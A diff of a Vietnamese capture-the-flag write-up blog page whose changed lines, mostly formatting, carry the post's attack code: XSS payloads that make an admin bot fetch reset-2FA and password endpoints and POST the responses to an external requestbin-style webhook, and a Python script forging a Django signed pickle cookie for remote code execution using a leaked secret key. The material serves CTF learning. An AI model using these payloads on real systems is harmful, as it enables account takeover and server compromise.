@@ -3,7 +3,7 @@
   <head prefix="og: http://ogp.me/ns#">
     <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="generator" content="Hugo 0.102.3">
+<meta name="generator" content="Hugo 0.92.2">
 <meta name="theme" content="Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world">
 
 
@@ -185,7 +185,7 @@
   
 
 
-<script src="/js/main.f1da21dfea83dc0c36cea0b202c14a97e00aedab567e32702eb120f5ab8d974b.js" integrity="sha256-8doh3&#43;qD3Aw2zqCyAsFKl&#43;AK7atWfjJwLrEg9auNl0s=" crossorigin="anonymous"></script>
+<script src="/js/main.e4ee12b434ffdd596ecf1fbccc43808313345020d5bfbf9a7ff3d761d07da22b.js" integrity="sha256-5O4StDT/3Vluzx&#43;8zEOAgxM0UCDVv7&#43;af/PXYdB9ois=" crossorigin="anonymous"></script>
 
   </head>
 
@@ -299,7 +299,7 @@
 
 <p>Bài này cho chúng ta input text và sử dụng wkhtmltoimage để generate ra hình ảnh.</p>
 <p>Thử với htmlinjection:</p>
-<pre aria-label="Box containing code sample." tabindex=0><code>/exploit?text=&lt;del%20style=&#34;color:red&#34;&gt;test&lt;/del&gt;&amp;color=%2324d600
+<pre aria-label="Box containing code sample." tabindex=0><code>/exploit?text=&lt;del%20style=&quot;color:red&quot;&gt;test&lt;/del&gt;&amp;color=%2324d600
 </code></pre><p>
 
 
@@ -330,7 +330,7 @@
 
 </p>
 <p>Thử xss 1 chút:</p>
-<pre aria-label="Box containing code sample." tabindex=0><code>/exploit?text=&lt;del%20id=&#34;test&#34; style=&#34;color:red&#34;&gt;test&lt;/del&gt;&lt;script&gt;test.innerText=&#34;changethistext&#34;&lt;/script&gt;&amp;color=%2324d600
+<pre aria-label="Box containing code sample." tabindex=0><code>/exploit?text=&lt;del%20id=&quot;test&quot; style=&quot;color:red&quot;&gt;test&lt;/del&gt;&lt;script&gt;test.innerText=&quot;changethistext&quot;&lt;/script&gt;&amp;color=%2324d600
 </code></pre><p>Yah, chữ <code>test</code> đã chuyển thành <code>changethistext</code>, chứng tỏ thẻ <code>&lt;script&gt;</code> hoạt động. Nice!!!, như vậy ta ta chỉ cần lấy dữ liệu từ /admin là có được flag.
 
 
@@ -363,12 +363,12 @@
 </p>
 <p>Payload</p>
 <pre tabindex="0"><code class="language-js=" data-lang="js=">&lt;script&gt;
-	var result = document.createElement(&#34;p&#34;);
+	var result = document.createElement(&quot;p&quot;);
 	var data = new XMLHttpRequest();
-	data.open(&#34;GET&#34;,&#34;http://localhost:5000/admin&#34;,false);
+	data.open(&quot;GET&quot;,&quot;http://localhost:5000/admin&quot;,false);
 	data.send();
 	data = data.responseText;
-	result.innerText = data.substr(data.search(&#34;flag{&#34;), data.search(&#34;}&#34;));
+	result.innerText = data.substr(data.search(&quot;flag{&quot;), data.search(&quot;}&quot;));
 	document.body.appendChild(result);
 &lt;/script&gt;
 </code></pre><p>Ta có được flag
@@ -477,7 +477,7 @@
 <p>Như vậy ta có thể đoán được secret nằm ở tài khoản của admin.</p>
 <p>Vào phần setting -&gt; feeback test payload xss.</p>
 <pre aria-label="Box containing code sample." tabindex=0><code>&lt;script&gt;
-fetch(&#39;http://iuxhte87.requestrepo.com&#39;);
+fetch('http://iuxhte87.requestrepo.com');
 &lt;/script&gt;
 </code></pre><p>
 
@@ -542,7 +542,7 @@ fetch(&#39;http://iuxhte87.requestrepo.com&#39;);
 <p>Có 2 chức năng trong phần settings này mà ta có thể lợi dụng là <code>Change password</code> và <code>Reset 2FA</code>. Để đổi mật khẩu thì phải cần OTP mà muốn có OTP thì phải có secret.</p>
 <p>Craft payload để lấy secret. Flow của mình là bắt adminbot truy cập vào /reset2fa, sau đó send response tới webhook của mình.</p>
 <pre aria-label="Box containing code sample." tabindex=0><code>&lt;script&gt;
-fetch(&#39;http://localhost:5000/reset2fa&#39;,{mode:&#39;no-cors&#39;, method:&#39;POST&#39;}).then(r=&gt;r.text()).then(data=&gt; fetch(&#39;http://iuxhte87.requestrepo.com&#39;, {method:&#39;POST&#39;, mode:&#39;no-cors&#39;, body: data}));
+fetch('http://localhost:5000/reset2fa',{mode:'no-cors', method:'POST'}).then(r=&gt;r.text()).then(data=&gt; fetch('http://iuxhte87.requestrepo.com', {method:'POST', mode:'no-cors', body: data}));
 &lt;/script&gt;
 </code></pre><p>TA-DA, đã có được secret:
 
@@ -577,21 +577,21 @@ fetch(&#39;http://localhost:5000/reset2fa&#39;,{mode:&#39;no-cors&#39;, method:&
 <p>Dùng 2fa.live để tạo ra OTP như trên. Bước tiếp theo ta chỉ cần đổi mật khẩu admin. Nhưng có 1 lưu ý là không thể sử dụng fetch API vì server có check cookie mà fetch chỉ có thể sendata mà không có cookie, do đó mình sử dụng XMLHttpRequest để include cookie vào request.</p>
 <p>Payload:</p>
 <pre tabindex="0"><code class="language-js=" data-lang="js=">&lt;script&gt;
-var url = &#34;http://localhost:5000/reset_password&#34;;
+var url = &quot;http://localhost:5000/reset_password&quot;;
 load(url);
 function load(url){
   var xhr = new XMLHttpRequest();
 
   xhr.onreadystatechange = function() {
     if (xhr.readyState === XMLHttpRequest.DONE) {
-      fetch(&#39;http://iuxhte87.requestrepo.com&#39;, {method:&#39;POST&#39;, mode:&#39;no-cors&#39;, body: xhr.responseText});
+      fetch('http://iuxhte87.requestrepo.com', {method:'POST', mode:'no-cors', body: xhr.responseText});
     }
   }
 
-  xhr.open(&#39;POST&#39;, url);
+  xhr.open('POST', url);
   xhr.withCredentials = true;
-  xhr.setRequestHeader(&#34;Content-Type&#34;, &#34;application/json;charset=UTF-8&#34;);
-  xhr.send(&#39;{&#34;otp&#34;:&#34;123122&#34;,&#34;password&#34;:&#34;a&#34;,&#34;password2&#34;:&#34;a&#34;}&#39;);
+  xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json;charset=UTF-8&quot;);
+  xhr.send('{&quot;otp&quot;:&quot;123122&quot;,&quot;password&quot;:&quot;a&quot;,&quot;password2&quot;:&quot;a&quot;}');
 }
 &lt;/script&gt;
 </code></pre><p>
@@ -874,23 +874,23 @@ function load(url){
   
 
 </p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>SECRET_KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;django-insecure-fnxu@v&amp;(wqd%77m6p#k_s2+n5na-bqe!m)^zu)9typ#0c&amp;8o6!&#34;</span>
-</span></span></code></pre></div><p>Mình exploit được chall này sau khi đọc qua bài viết này:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">SECRET_KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;django-insecure-fnxu@v&amp;(wqd%77m6p#k_s2+n5na-bqe!m)^zu)9typ#0c&amp;8o6!&#34;</span>
+</code></pre></div><p>Mình exploit được chall này sau khi đọc qua bài viết này:
 <a href="https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/">https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/</a></p>
 <p>Tuy nhiên mình sử dụng python3 nên custom lại script 1 chút:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> django.core.signing<span style="color:#f92672">,</span> django.contrib.sessions.serializers
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle<span style="color:#f92672">,</span> os
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>SECRET_KEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;77m6p#v&amp;(wk_s2+n5na-bqe!m)^zu)9typ#0c&amp;@qd</span><span style="color:#e6db74">%8o</span><span style="color:#e6db74">6!&#39;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PickleRce</span>(object):
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system,(<span style="color:#e6db74">&#34;sleep 5&#34;</span>,))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>cookie <span style="color:#f92672">=</span> django<span style="color:#f92672">.</span>core<span style="color:#f92672">.</span>signing<span style="color:#f92672">.</span>dumps(PickleRce(),key<span style="color:#f92672">=</span>SECRET_KEY,serializer<span style="color:#f92672">=</span>django<span style="color:#f92672">.</span>contrib<span style="color:#f92672">.</span>sessions<span style="color:#f92672">.</span>serializers<span style="color:#f92672">.</span>PickleSerializer,salt<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;django.contrib.sessions.backends.signed_cookies&#34;</span>,compress<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print(cookie)
-</span></span></code></pre></div><p>Set cookie userid lại ta thấy response trả về từ server bị delay 5s, như vậy ta có thể reverse shell để lấy được flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> django.core.signing<span style="color:#f92672">,</span> django.contrib.sessions.serializers
+<span style="color:#f92672">import</span> pickle<span style="color:#f92672">,</span> os
+
+SECRET_KEY<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;77m6p#v&amp;(wk_s2+n5na-bqe!m)^zu)9typ#0c&amp;@qd</span><span style="color:#e6db74">%8o</span><span style="color:#e6db74">6!&#39;</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PickleRce</span>(object):
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>system,(<span style="color:#e6db74">&#34;sleep 5&#34;</span>,))
+
+cookie <span style="color:#f92672">=</span> django<span style="color:#f92672">.</span>core<span style="color:#f92672">.</span>signing<span style="color:#f92672">.</span>dumps(PickleRce(),key<span style="color:#f92672">=</span>SECRET_KEY,serializer<span style="color:#f92672">=</span>django<span style="color:#f92672">.</span>contrib<span style="color:#f92672">.</span>sessions<span style="color:#f92672">.</span>serializers<span style="color:#f92672">.</span>PickleSerializer,salt<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;django.contrib.sessions.backends.signed_cookies&#34;</span>,compress<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+
+print(cookie)
+</code></pre></div><p>Set cookie userid lại ta thấy response trả về từ server bị delay 5s, như vậy ta có thể reverse shell để lấy được flag.</p>
 
 
         
